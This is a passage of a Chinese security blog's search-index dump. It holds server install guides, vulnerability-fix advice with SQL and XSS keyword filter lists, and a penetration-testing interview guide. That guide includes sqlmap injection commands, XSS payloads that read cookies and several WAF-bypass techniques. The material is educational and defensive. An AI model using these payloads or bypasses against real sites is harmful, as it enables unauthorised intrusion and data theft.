1;%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin 然后保存，重新打开终端，分别输入 java -version 和 javac -version ，若均显示出对应的版本信息，则说明环境变量配置成功，如下所示。 123456789101112Microsoft Windows [版本 6.3.9600](c) 2013 Microsoft Corporation。保留所有权利。C:\\Users\\Administrator&gt;java -versionjava version \"1.8.0_191\"Java(TM) SE Runtime Environment (build 1.8.0_191-b12)Java HotSpot(TM) 64-Bit Server VM (build 25.191-b12, mixed mode)C:\\Users\\Administrator&gt;javac -versionjavac 1.8.0_191C:\\Users\\Administrator&gt; 开始安装 启动安装程序 在weblogic官网下载的是一个zip压缩文件，解压后为一个jar包。 打开终端，进入安装包的存放路径，输入以下命令启动安装程序： 1java -jar fmw_12.2.1.3.0_wls.jar 选择安装路径 选择安装类型（软件功能点） 之后进入 先决条件检查，然后是安装概要，没有问题后，我们点击安装。 可以看它的安装进度，等待它安装完成即可。 部署weblogic 在开始中找到Configuration Wizard即配置向导，开始创建域。 下图所示，默认选中第一个Basic Weblogic Server ......，即创建基本的域即可。其它几种domain类型是针对特定应用的，如sip、webservice。 设置管理员账号即管理domain（修改配置、启动、停止等维护操作）的操作账号。 选择域模式和JDK。 weblogic提供两种启动模式（开发模式、生产模式）。 开发模式，启动domain是不需要输入管理账号、密码的，并且轮训部署的应用程序，如果有文件更新，会自动更新（传说中的热部署）。 生产模式，启动domain必须输入管理账号、密码。为了提高性能，不会对应用程序进行轮训，而且建议使用原先bea自带的jrockit jdk作为运行的jdk（不过自从被oracle收购之后，安装目录下未提供jrockit jdk了（需要自行下载）。 这里选择默认的开发模式，选择JDK之后，点击下一步。 高级配置（可选配置），一般涉及到集群才需要选择，这里直接下一步。 配置概要，点击创建按钮，进行domain的创建。 配置进度。 配置完毕后如下图，可以选中点击启动管理服务器立即启动服务器。或者点击完成退出安装向导界面（后面如果启动服务器，到域目录下双击startWebLogic.cmd即可。 启动服务器 到域目录下双击startWebLogic.cmd即可。 1D:\\Oracle\\Middleware\\Oracle_Home\\user_projects\\domains\\base_domain\\startWebLogic.cmd 等待一会，看到有IP+端口(7001)后说明服务器启动完毕，或者说命令窗口不动后。 登录控制台，输入之前配置的管理账号、口令。 如下，就是WebLogic Server管理控制台，可以部署war包等操作。 部署war包，这里就不介绍了，可参考下面这篇文章。与其他中间件部署war步骤大体相同。 weblogic部署web项目（war包）- 阿叮339 注意：如果需要关闭weblogic，只需关闭weblogic窗口(即启动weblogic服务器时打开的命令窗口)就可以了。 weblogic的管理账号和密码会存储在本地的boot.properties文件中，可解密出明文，并不安全。 安装过程可能遇到的有一些报错a. 不是有效的JDK java 主目录出现错误提示 1234567891011java -jar fmw_12.2.1.3.0_wls.jar启动程序日志文件为C:\\Users\\Administrator\\AppData\\Local\\Temp\\OraInstall2019-10-09_10-29-34AM\\launcher2019-10-09_10-29-34AM.log。正在提取安装程序... . . . . . . . . . . . . . . . . . . . . . . . .. . . . . . . . 完成此安装程序必须使用 Java 开发工具包 (JDK) 执行,但 C:\\Program Files\\Java\\jre1.8.0_191 不是有效的 JDK Java 主目录。日志位于此处: C:\\Users\\Administrator\\AppData\\Local\\Temp\\OraInstall2019-10-09_10-29-34AM\\launcher2019-10-09_10-29-34AM.log。按 Enter 退出 说明没有指定jdk中的java.exe程序，另外要以管理员身份运行cmd。 方法1：把安装包（jar包）移动到java.exe程序的同级目录中，然后运行java -jar fmw_12.2.1.3.0_wls.jar 方法2：直接指定jdk中的java.exe程序来运行jar包。 1D:\\fmw&gt;\"C:\\Program Files\\Java\\jdk1.8.0_191\\bin\\java\" -jar fmw_12.2.1.3.0_wls.jar 也可参考这篇文章cmd安装weblogic12c提示jre不是有效的JDK java主目录`问题解决过程 - heremy b. 找不到Configuration Wizard配置向导如果在开始程序中找不到Configuration Wizard配置向导，可以在weblogic的安装路径中找到config.cmd，运行它。 1D:\\Oracle\\Middleware\\Oracle_Home\\oracle_common\\common\\bin\\config.cmd 参考WebLogic(12C)——windows下安装教程 - M_ling 超详细 Windows下安装以及部署Weblogic - 叁念 WebLogic常见问题 - Mr_sheng weblogic部署web项目（war包）- 阿叮339","tags":[{"name":"安装","slug":"安装","permalink":"https://laoel.github.io/tags/安装/"},{"name":"weblogic","slug":"weblogic","permalink":"https://laoel.github.io/tags/weblogic/"}]},{"title":"在ubuntu18.04上安装和配置Apache2","date":"2019-10-09T06:53:40.000Z","path":"2019/10/09/在ubuntu18-04上安装和配置Apache2/","text":"apache介绍Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器软件，可以在大多数计算机操作系统中运行，由于其跨平台和安全性，被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩展，将Perl/Python等解释器编译到服务器中。Apache HTTP服务器是一个模块化的服务器，源于NCSAhttpd服务器，经过多次修改，成为世界使用排名第一的Web服务器软件。 目录结构12/var/www/html/ # 网站根目录├── index.html 1234567891011/etc/apache2/ # Apache 配置文件的目录├── apache2.conf # Apache配置文件├── conf-available├── conf-enabled├── envvars├── magic├── mods-available├── mods-enabled├── ports.conf├── sites-available└── sites-enabled 1234/var/log/apache2/ # Apache存放日志的目录├── access.log├── error.log└── other_vhosts_access.log 安装 首先更新软件 1sudo apt update &amp;&amp; sudo apt upgrade update 和 upgrade 的区别 update 是同步 /etc/apt/sources.list 和 /etc/apt/sources.list.d 中列出的源的索引，这样才能获取到最新的软件包。 upgrade 是升级已安装的所有软件包，升级之后的版本就是本地索引里的，因此，在执行 upgrade 之前一定要执行 update, 这样才能是最新的。 安装apache2软件包 1sudo apt install apache2 查看Apache2 服务状态，看到Active: active (running)即代表服务在运行中。 1service apache2 status 浏览器打开 http://127.0.0.1 ,会看到Apache的默认页面，也就代表安装成功。 常用管理命令 命令 作用 systemctl status apache2 查看服务状态 systemctl start apache2 启用Apache Web服务 systemctl stop apache2 停止Apache Web服务 systemctl restart apache2 重启Apache Web服务 systemctl reload apache2 载入Apache配置文件 systemctl disable apache2 禁用Apache服务的开机自启设置 systemctl enable apache2 设置Apache服务为开机自启 参考如何在 Ubuntu 上安装和优化 Apache - Thishosting 如何在Ubuntu 18.04上安装Apache Web服务器 - howtoing Apache官网的一些安全配置建议","tags":[{"name":"Apache","slug":"Apache","permalink":"https://laoel.github.io/tags/Apache/"},{"name":"配置","slug":"配置","permalink":"https://laoel.github.io/tags/配置/"}]},{"title":"cve-2019-0708漏洞复现","date":"2019-10-06T06:22:51.000Z","path":"2019/10/06/cve-2019-0708漏洞复现/","text":"文章待补充 CVE-2019-0708 | 远程桌面服务远程执行代码漏洞 当未经身份验证的攻击者使用RDP连接到目标系统并发送特制请求时，远程桌面服务（以前称为终端服务）中存在一个远程执行代码漏洞。此漏洞是预先认证的，不需要用户交互。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。然后，攻击者可能会安装程序。查看，更改或删除数据；或创建具有完全用户权限的新帐户。 要利用此漏洞，攻击者需要通过RDP向目标系统远程桌面服务发送特制请求。 此更新通过更正远程桌面服务处理连接请求的方式来解决漏洞。 EXP公开Metasploit 在博客和推特上相继发布消息称，Metasploit正式集成针对CVE-2019-0708（也称为BlueKeep）的漏洞利用模块，虽然目前的初始版本只适用于64位版本的Windows 7和Windows 2008 R2，但也释放出了一个威胁信号，无数潜在攻击者已经开始关注到这个信息，随着后续模块更新，BlueKeep漏洞的威力也会逐渐显现出来。 Windows7 复现过程 输入msfconsole打开msf，确保版本是5.0以上的。 参考文章https://www.freebuf.com/vuls/213745.html https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708 https://github.com/rapid7/metasploit-framework/pull/12283","tags":[{"name":"CVE","slug":"CVE","permalink":"https://laoel.github.io/tags/CVE/"}]},{"title":"CFOP  公式图  超清版","date":"2019-10-04T14:52:15.000Z","path":"2019/10/04/CFOP-公式图-超清版/","text":"点此查看","tags":[{"name":"CFOP公式","slug":"CFOP公式","permalink":"https://laoel.github.io/tags/CFOP公式/"},{"name":"魔方","slug":"魔方","permalink":"https://laoel.github.io/tags/魔方/"}]},{"title":"网络安全聚合列表","date":"2019-10-04T14:43:55.000Z","path":"2019/10/04/网络安全聚合列表/","text":"安全 | 社区 | 平台 | 媒体乌云知识库 铁匠运维网 i春秋社区 先知社区 看雪论坛 吾爱破解 安全博客 freebuf 漏洞银行 安全客 seebug sec-wiki mottoin 安全牛 E安全 即刻安全 撕吼 游侠安全网 漏洞时代 华盟网 iOSRE | 逆 0x00sec kali linux 破壳 信息安全知识库 漏洞库乌云镜像 CVE cybercrime Exploit Database 同程SRC - 公开漏洞 比戈大牛漏洞列表 Blog尼古拉斯.赵四 nMask风陵渡口 itPoet Neurohazard 小小吴 危险漫步 masterxsec volatileminds 阿德马Web安全 lynn 360Unicorn seebug-Paper A.T365 Cracer 安全 安全帮 红日攻防 蓝鲸安全 dewhurst codemetrix à ō é study优质安全列表 Web-Security-Learning OWASP测试指南 飞龙 逆向教程 iOS 安全攻防 移动安全入门 owasp-mstg Kali Linux 渗透 Android Developer Apple Developer 众测平台阿里先知 漏洞盒子 CNVD 教育行业(Beta) seebug 比戈大牛 SRCs | src收录列表 360SRC TSRC ASRC USRC 网易SRC 信息收集 | 加密解密 | 在线检测Whois查询 微步在线 FOFA Pro SEO查询 ZoomEye BugScaner C段查询 C段 | 5kik ipip.net Shodan XSS平台 SOMD5 chamd5 MD5 &amp; SHA1 dmd5 梆梆-APP检测 360显危镜 腾讯哈勃 百度云观测 UpGuard 安全招聘freebuf招聘站 i春秋招聘专版 安全脉搏招聘贴 看雪论坛招聘专区 先知社区招聘贴 安全牛招聘站 吾爱破解招聘区 mottoin招聘贴 others铁匠运维网友链 Web安全常见漏洞修复建议 - 平安安全博客 Goole Code 国外信息安全Feed源 Web安全漏洞加固手册 常见漏洞和解决办法-360","tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://laoel.github.io/tags/网络安全/"},{"name":"信息安全","slug":"信息安全","permalink":"https://laoel.github.io/tags/信息安全/"}]},{"title":"一些web安全漏洞介绍和修复建议","date":"2019-10-04T14:42:47.000Z","path":"2019/10/04/一些web安全漏洞介绍和修复建议/","text":"高危-SQL注入【漏洞危害】 [1] 攻击者通过SQL注入，能够直接获取数据库敏感数据，设置通过数据库执行系统命令。 【解决方法】 [1] 使用全局过滤器，过滤特殊字符，正确处理数据类型。包括但不限于以下字符及字符串：select and or like regxpfrom where update exec order by having drop delete ( ) [ ] &lt; &gt; , . ; : ‘“ # % + - _ = / * @。 [2] 预编译 SQL 语句，而不要动态组装 SQL 语句，否则必须确保在使用输入的数据组装成SQL 语句之前，对特殊字符进行预处理。 [3] 以最小权限执行 SQL 语句。 [4] 屏蔽错误回显。 [5] 必要时，限制长度。 高危-存储型XSS【漏洞危害】 [1] 攻击者通过存储型XSS，不仅能够进行钓鱼，窃取用户登录会话，甚至能够直接控制浏览器，或者引发蠕虫攻击。 【解决方法】 [1] 检查网站所有用户输入数据的地方是否有进行过滤处理。过滤处理包括但不限于以下字符及字符串：Javascript script src imgonerror { } ( ) &lt; &gt; = , . ; : “ ‘ # ! / * \\。 [2] 根据页面的输出背景环境，对输出进行编码或使用一个统一的规则和库做输出编码，使用安全框架进行安全编码。 [3] 对于富文本框，使用白名单控制输入，而不是黑名单。 高危-未授权访问【漏洞危害】 [1] 权限控制不当，会造成网站数据非法篡改等。 [2] 泄露敏感数据。 【解决方法】 [1] 权限控制。 [2] 需登录的系统，页面的权限不可含空用户。 低危-敏感信息明文传输【漏洞危害】 [1] 由于用户认证在传输过程中没有进行加密，第三方可以通过中途拦截非加密的HTTP连接，读取用户认证信息。攻击者获得该信息后，登录前台或后台，篡改用户前台或后台信息等。 【解决方法】 [1] 使用业界较为安全的算法，诸如非对称算法等对传输过程中的用户名、密码、银行卡号等业务敏感信息进行加密处理。 [2] 网站部署HTTPS协议。 中危-用户猜测【漏洞危害】 [1] 攻击者能够快速定位到存在的用户，并进行针对性的攻击，进而较少攻击成本。 [2] 攻击者通过用户名猜测和验证码失效进行组合攻击。 【解决方法】 [1] 统一错误回显。 [2] 使用账号锁定策略。 [3] 使用复杂的验证码。 低危-默认报错信息【漏洞危害】 [1] 造成信息泄露，诸如中间件版本，数据库的列名或相关的查询语句等信息，给攻击者的下一步攻击做准备。 【解决方法】 [1] 优化代码从而避免程序报错。 [2] 隐藏默认报错页面中的敏感信息，自定义错误页面来屏蔽错误信息，统一回显错误信息。 中危-CSRF跨站请求伪造【漏洞危害】 [1] CSRF跨站请求伪造攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作。 【解决方法】 [1] 在所有请求地址中添加 token 并验证。 [2] 验证 HTTP Referer 字段。 [3] 敏感操作需要验证码，更改密码需要验证老密码。 [4] 在HTTP头中自定义属性并验证。。 高危-任意文件上传【漏洞危害】 [1] 攻击者可以上传任意文件（包括后门文件等）直接控制服务器。 【解决方法】 [1] 检测上传元信息。 [2] 服务器端严格校验文件后缀。 [3] 根据业务，正确放回响应头（Content-Type）。 [4] 校验上传文件的内容。 中危-Apache Tomcat样例目录session操纵【漏洞危害】 [1] 攻击者可以通过操纵session获取管理员权限。 【解决方法】 [1] 删除tomcat示例文件等不必要的数据。 网站存在Apache Tomcat样例目录，又ession是全局通用的，所以用户可以通过操纵session获取管理员权限，具体利用过程可看以下链接： http://blog.51cto.com/chenjc/1434858 ApacheTomcat样例目录session操纵漏洞-龙与小妞-51CTO博客 低危-重放攻击【漏洞危害】 [1] 攻击者可以重放添加发起问卷的请求包，耗费后台资源。 【解决方法】 [1] 对账号新增数据包添加token唯一标识，每次成功之后必须更新toekn才能重新进行。 [2] 检验特定字段的唯一性。 中危-敏感信息泄露【漏洞危害】 [1] 信息泄露。 【解决方法】 [1] 屏蔽敏感信息，数据返回包去掉不必要的敏感信息。 [2] 用户密码等敏感信息，不要存储在前端。 中危-登录验证码绕过【漏洞危害】 [1] 验证码不失效，导致攻击者能够不断重放请求，爆破管理员账号。 【解决方法】 [1] 添加验证码的次数限制。 低危-使用GET方法传输业务敏感信息【漏洞危害】 [1] 信息泄露。 【解决方法】 [1] 使用POST方法传输用户名和密码等敏感信息。 低危-目录浏览【漏洞危害】 [1]信息泄露以及暴露网站的目录结构。 【解决方法】 [1] 页面权限控制。 [2] 关闭目录浏览功能。 高危-越权访问【漏洞危害】 [1] 权限控制不当，会造成网站数据非法篡改等。 【解决方法】 [1] 验证一切来自客户端的参数，重点是和权限相关的参数，比如用户ID或者角色权限ID等。 [2] session ID 和认证的token做绑定，放在服务器的会话里，不发送给客户端。 [3] 对于用户登录后涉及用户唯一信息的请求，每次都要验证检查所有权，敏感信息页面加随机数的参数，防止浏览器缓存内容。 高危-服务端请求伪造攻击SSRF【漏洞危害】 [1] 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。 [2] 攻击运行在内网或本地的应用程序（比如溢出）。 [3] 对内网web应用进行指纹识别，通过访问默认文件实现。 [4] 攻击内外网的web应用。 [5] 利用file协议读取本地文件等。。 【解决方法】 [1] 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件,那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 [2] 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 [3] 限制请求的端口为http常用的端口。 [4] 黑名单内网ip，避免应用被用来获取获取内网数据，攻击内网。 [5] 禁用不需要的协议。","tags":[{"name":"修复建议","slug":"修复建议","permalink":"https://laoel.github.io/tags/修复建议/"},{"name":"web漏洞","slug":"web漏洞","permalink":"https://laoel.github.io/tags/web漏洞/"}]},{"title":"近期爆出的大漏洞 值得记录","date":"2019-10-04T14:41:56.000Z","path":"2019/10/04/近期爆出的大漏洞-值得记录/","text":"成功获取WinRAR 19年历史代码执行漏洞 https://research.checkpoint.com/extracting-code-execution-from-winrar/ 2019年2月20日 研究人员： Nadav Grossman “水滴”来袭：详解Binder内核通杀漏洞 http://blogs.360.cn/post/Binder_Kernel_Vul_CH.html 2019年3月4日 作者: Hongli Han(@hexb1n) of Qihoo 360 C0RE Team 关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告 http://www.cnvd.org.cn/webinfo/show/4989 2019-04-17 CNVD","tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://laoel.github.io/tags/漏洞/"},{"name":"漏洞预警","slug":"漏洞预警","permalink":"https://laoel.github.io/tags/漏洞预警/"}]},{"title":"网络安全 方面 好文章 摘录","date":"2019-10-04T14:41:42.000Z","path":"2019/10/04/网络安全-方面-好文章-摘录/","text":"Android 第三方加固方案 对比 https://www.cnblogs.com/baiqiantao/p/9286449.html 20180709 白乾涛 App漏洞扫描哪家强？ http://blog.sina.com.cn/s/blog_3eecddd20102yf65.html 20181228 移动互联网李建华 Android-APP安全系列文章 作者：Lemon Android-APP安全测试（一） Android-APP安全测试（二） Android-APP安全测试（三） Android-APP安全（四）之流量分析与内外存储 Android-APP 安全（五）之android取证-文件系统与数据结构 Android-APP 安全（六）之android取证","tags":[{"name":"技术文章","slug":"技术文章","permalink":"https://laoel.github.io/tags/技术文章/"},{"name":"摘录","slug":"摘录","permalink":"https://laoel.github.io/tags/摘录/"}]},{"title":"网络安全 好书 摘记","date":"2019-10-04T13:21:21.000Z","path":"2019/10/04/网络安全-好书-摘记/","text":"web安全 白帽子讲Web安全（纪念版） https://item.jd.com/11483966.html 出版时间：2014-06-01 吴翰清 著 Web安全深度剖析 https://item.jd.com/11673055.html 出版时间：2015-04-01 张炳帅 著 Web安全攻防：渗透测试实战指南 https://item.jd.com/12401707.html 出版时间：2018-07-01 徐焱，李文轩，王东亚 著 内网安全攻防：渗透测试实战指南 https://item.jd.com/12743210.html 出版时间：2019-11-01 徐焱，贾晓璐 著 Web攻防之业务安全实战指南 https://item.jd.com/12306251.html 出版时间：2018-03-01 陈晓光 胡兵 张作峰 等 著 移动安全 Android软件安全权威指南 https://item.jd.com/12522178.html 出版时间：2019-03-01 丰生强 著 Android应用安全防护和逆向分析 https://item.jd.com/12271376.html 出版时间：2017-12-01 姜维 著 iOS应用逆向与安全 https://item.jd.com/12361729.html 出版时间：2018-06-01 刘培庆 著 iOS应用逆向工程 第2版 https://item.jd.com/11670145.html 出版时间：2015-04-01 沙梓社，吴航 著 IoT安全 硬件安全攻防大揭秘 https://item.jd.com/12024487.html 出版时间：2017-02-01 360独角兽安全团队（UnicornTeam），简云定，杨卿 等 著 无线电安全攻防大揭秘 https://item.jd.com/11915577.html 出版时间：2016-04-01 360独角兽安全团队（UnicornTeam） 著 甲方安全建设 企业安全建设指南：金融行业安全架构与技术实践 https://item.jd.com/12570616.html 出版时间：2019-04-01 聂君，李燕，何扬军 著 数据安全架构设计与实战 https://item.jd.com/12731728.html 出版时间：2019-11-01 郑云文 著 网络安全态势感知 提取、理解和预测 https://item.jd.com/12410450.html 出版时间：2018-07-01 杜嘉薇，周颖，郭荣华，索国伟 著","tags":[{"name":"摘录","slug":"摘录","permalink":"https://laoel.github.io/tags/摘录/"},{"name":"书籍推荐","slug":"书籍推荐","permalink":"https://laoel.github.io/tags/书籍推荐/"}]},{"title":"我的面经，渗透测试","date":"2019-10-03T03:24:31.000Z","path":"2019/10/03/我的面经，渗透测试/","text":"00x00 摘要笔者作为网络安全的初识者，从求职者的角度总结了一点点关于渗透测试工程师求职面试的要点给即将毕业的大学生（实习生和应届生）予以参考，以便能更好更快地找到一份自己满意的工作。总结基于笔者本人的几次面试经历，都是自己在各招聘网投简历（广州的几家公司）。 这里简单自我介绍一下： 我自学web渗透和Android逆向半年有余，目前已有将近一年的实习经验，计算机网络专业的专科生，通过赛事接触web渗透，实习时接触Android逆向，继而初识网络安全。没有什么值得吹嘘的事，O(∩_∩)O哈哈~，没事就学习研究。比较感兴趣的方向有：WEB渗透测试、Android逆向、IOT安全、等级保护。 个人博客 https://laoel.github.io 00x01 现场面试准备 简历（打印3份以上，彩色），身份证，毕业证等资料； 电脑（吃饭的家伙，无线鼠标，电源线等）； 本子和笔，着装整洁，守时（约好时间，提前20分钟到）； 面试公司的认识（地点，看看公司官网，了解公司发展时间戳，部门等）。 00x02 对于电话面试（技术员工）- 可看着读a. 约好时间并提前15分钟找个安静，没人打扰的地方，注意手机电量和信号； b. 站着进行电话面试，保持微笑，通话可录音； c. 一份简历，本子和笔，耳机等（看着简历来）； d. 先想好，面试官会问的问题及答案，记要点（渗透测试的思路等）。 00x03 面试官问的问题（技术员工或部门经理+HR）Q1 自我介绍1）可参照简历 2）有条理（三分钟左右） Q2 一个网站的渗透测试思路，流程（给你一个网站，怎么做？）1）信息收集 a. 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） b. 网站指纹识别（包括，cms，cdn，证书等），dns记录 c. whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） d. 子域名收集，旁站查询(有授权可渗透)，C段等 e. google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 f. 扫描网站目录结构，爆后台，网站banner，文件等敏感文件泄漏等 i. 传输协议，通用漏洞，exp，github源码等 2）漏洞挖掘 1&gt; 浏览网站，看看网站规模，功能，特点等 2&gt; 端口，弱口令，目录等扫描 3&gt; XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等 3）漏洞利用 | 权限提升 a) mysql提权，serv-u提权，linux内核版本提权等 4）清除测试数据 | 输出报告 i 日志、测试数据的清理 ii 总结，输出渗透测试报告，附修复方案 5) 复测 验证并发现是否有新漏洞，输出报告，归档Q3 一个APP的逆向分析思路（给你一个APP，怎么做？）这里简单列一下app测试的大纲，详细不便放出（可参照OWASP的 mstg）： 1代码保护检测，2数据存储安全，3加密算法，4四大组件安全，5应用规范等（ 具体的可关注我 的博客，后续会发布相关的文章 ）。 Q4 简述某一漏洞的原理和渗透手法（SQL注入，XSS，CSRF等）SQL注入- 百度百科 SQL注入原理 a. SQL（结构化语句查询） b. 提交参数（调用数据库查询）的地方是用户可控的，并未做任何过滤处理 c. 分 数字型，字符型，搜索型，POST注入，Cookie注入，延时注入，盲注等 SQL注入，注入方法 1）如果是get型号，直接，sqlmap-u “注入点URL”. 2) 如果是post型诸如点，可以sqlmap-u “注入点URL” –data=”post的参数” 3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用 * 号替换，放到文件里，然后sqlmap -r “文件地址” XSS跨站脚本攻击 - 百度百科 XSS原理 网站未对用户输入的数据做过滤处理，构造特定的JS脚本插入到文本框可引发XSS，会被浏览器解析，执行。 XSS常见攻击语句 12345&lt;BODY onload=\"alert('XSS')\"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;iframe src=\"javascript:alert(1)\"&gt;&lt;/iframe&gt;&lt;svg /onload=prompt(1)&gt;&lt;img src=\" \"=\" \" onerror=\"alert('xss')\"&gt; Q5 语言1，python，JAVA，算法，二进制等编程能力（笔者暂未学，不深入探讨） 2，ARM汇编（基本的汇编指令，寄存器等） 3，英语（CET-4，CET-6） Q6 WAF bypass1，关键字可以用%（只限IIS系列）。比如select，可以sel%e%ct 2，通杀的，内联注释，如/!select/ 3，编码，可两次编码 4，multipart请求绕过，在POST请求中添加一个上传文件，绕过了绝大多数WAF 5，参数绕过，复制参数，id=1&amp;id=1 6，内联注释 Q7 Kali的使用（Linux系统）kali菜单中各工具功能 - 努力改个网名 - 博客园 whatweb 指纹识别 dirb 目录扫描 whois whois查询 无线攻击套件 字典生成套件 爆破工具 Q8 OWASP-Top10web A1 注入， A2 失效的身份认证， A3 敏感信息泄露， A4 XML外部实体(XXE)， A5 失效的访问控制， A6 安全配置错误， A7 跨站脚本(XSS)， A8 不安全的反序列化， A9 使用含有已知漏洞的组件， A10 不足的日志记录和监控 https://www.owasp.org/index.php/Top_10-2017_Top_10h mobile M1-平台使用不当，M2-不安全的数据存储，M3-不安全的通信，M4-不安全的身份验证，M5-加密不足，M6-不安全的授权，M7-客户端代码质量问题，M8-代码篡改，M9-逆向工程，M10-无关的功能 https://www.owasp.org/index.php/Mobile_Top_10_2016-Top_10 Q9 网络安全事件应急响应（如，一业务主站被挂黑页的处理流程及应对方法）1. 取证，登录服务器，备份，检查服务器敏感目录，查毒（搜索后门文件 - 注意文件的时间，用户，后缀等属性），调取日志（系统日志，中间件日志，WAF日志等）； 2. 处理，恢复备份（快照回滚，最近一次），确定入侵方法（漏洞检测，并进行修复） 3. 溯源，查入侵IP，入侵手法（网路攻击事件）的确定等 4. 记录，归档--------预防-事件检测-抑制-根除-恢复-跟踪-记录通用漏洞的应对等其他安全应急事件 Q10 提交过的漏洞国内外的漏洞提交平台（先知、漏洞盒子），各SRC等 Q11 其他优势1，新兴技术的研究（IOT安全，区块链，人工智能，机器学习等） 2，个人博客（原创文章），投稿，人脉，安全峰会，安全研究Paper, 安全议题分享等 3，比赛（CTF，团队比赛等），线下培训 4，在校经历（获奖，个人项目，团队活动，担任学生干部等） Q12 读过的技术书籍（学习的途径）《白帽子讲web安全》、《ios应用逆向工程-第2版》、《Android应用安全防护和逆向分析》、《汇编语言-第3版》、《OWASP-MSTG》、《C#灰帽子：设计安全测试工具》 00x04 问面试官的问题q1 贵公司，信息安全部门的规模，发展等 q2 劳动合同（实习生签三方协议和转正问题），是否解决户口 q3 薪资（税后），奖金，股票期权，福利，活动，补贴 等 q4 任职后的工作职责，内容，出差，时间等 00x05 面试总结 记录面试官的问题和自己的回答 查漏补缺 收获 是否通过，下次面试或报道入职时间 00x06 扩展阅读网络安全、Web安全、渗透测试之笔经面经总结（三） - christychang Web 安全渗透方面的学习路线? - 知乎 【分享】一套实用的渗透测试岗位面试题，你会吗？ - Shun’s Blog 面试前都需要做些什么准备？- 知乎","tags":[{"name":"面试经验","slug":"面试经验","permalink":"https://laoel.github.io/tags/面试经验/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://laoel.github.io/tags/渗透测试/"}]},{"title":"markdown 语法介绍","date":"2019-09-29T02:02:40.000Z","path":"2019/09/29/markdown-语法介绍/","text":"原文地址 http://editor.md.ipandao.com/examples/full.html Editor.md Heading 1Heading 2Heading 3Heading 4Heading 5Heading 6Heading 1 link Heading linkHeading 2 link Heading linkHeading 3 link Heading linkHeading 4 link Heading link Heading link Heading linkHeading 5 link Heading linkHeading 6 link Heading link标题（用底线的形式）Heading (underline)This is an H1This is an H2字符效果和横线等 删除线 删除线（开启识别HTML标签时）斜体字 斜体字粗体 粗体粗斜体 粗斜体 上标：X2，下标：O2 缩写(同HTML的abbr标签) 即更长的单词或短语的缩写形式，前提是开启识别HTML标签时，已默认开启 The HTML specification is maintained by the W3C. 引用 Blockquotes 引用文本 Blockquotes 引用的行内混合 Blockquotes 引用：如果想要插入空白换行即&lt;br /&gt;标签，在插入处先键入两个以上的空格然后回车即可，普通链接。 锚点与链接 Links普通链接 普通链接带标题 直接链接：https://github.com 锚点链接 mailto:test.test@gmail.com GFM a-tail link @pandao 邮箱地址自动链接 test.test@gmail.com www@vip.qq.com @pandao 多语言代码高亮 Codes行内代码 Inline code执行命令：npm install marked 缩进风格即缩进四个空格，也做为实现类似 &lt;pre&gt; 预格式化文本 ( Preformatted Text ) 的功能。 &lt;?php echo &quot;Hello world!&quot;; ?&gt;预格式化文本： | First Header | Second Header | | ------------- | ------------- | | Content Cell | Content Cell | | Content Cell | Content Cell |JS代码 123456789101112131415161718192021222324252627282930313233343536function test() &#123; console.log(\"Hello world!\");&#125; (function()&#123; var box = function() &#123; return box.fn.init(); &#125;; box.prototype = box.fn = &#123; init : function()&#123; console.log('box.init()'); return this; &#125;, add : function(str) &#123; alert(\"add\", str); return this; &#125;, remove : function(str) &#123; alert(\"remove\", str); return this; &#125; &#125;; box.fn.init.prototype = box.fn; window.box =box;&#125;)();var testBox = box();testBox.add(\"jQuery\").remove(\"jQuery\"); HTML 代码 HTML codes1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;mate charest=\"utf-8\" /&gt; &lt;meta name=\"keywords\" content=\"Editor.md, Markdown, Editor\" /&gt; &lt;title&gt;Hello world!&lt;/title&gt; &lt;style type=\"text/css\"&gt; body&#123;font-size:14px;color:#444;font-family: \"Microsoft Yahei\", Tahoma, \"Hiragino Sans GB\", Arial;background:#fff;&#125; ul&#123;list-style: none;&#125; img&#123;border:none;vertical-align: middle;&#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 class=\"text-xxl\"&gt;Hello world!&lt;/h1&gt; &lt;p class=\"text-green\"&gt;Plain text&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 图片 ImagesImage: Follow your heart. 图为：厦门白城沙滩 图片加链接 (Image + Link)： 图为：李健首张专辑《似水流年》封面 列表 Lists无序列表（减号）Unordered Lists (-) 列表一 列表二 列表三 无序列表（星号）Unordered Lists (*) 列表一 列表二 列表三 无序列表（加号和嵌套）Unordered Lists (+) 列表一 列表二 列表二-1 列表二-2 列表二-3 列表三 列表一 列表二 列表三 有序列表 Ordered Lists (-) 第一行 第二行 第三行 GFM task list GFM task list 1 GFM task list 2 GFM task list 3 GFM task list 3-1 GFM task list 3-2 GFM task list 3-3 GFM task list 4 GFM task list 4-1 GFM task list 4-2 绘制表格 Tables 项目 价格 数量 计算机 $1600 5 手机 $12 12 管线 $1 234 First Header Second Header Content Cell Content Cell Content Cell Content Cell First Header Second Header Content Cell Content Cell Content Cell Content Cell Function name Description help() Display the help window. destroy() Destroy your computer! Left-Aligned Center Aligned Right Aligned col 3 is some wordy text $1600 col 2 is centered $12 zebra stripes are neat $1 Item Value Computer $1600 Phone $12 Pipe $1 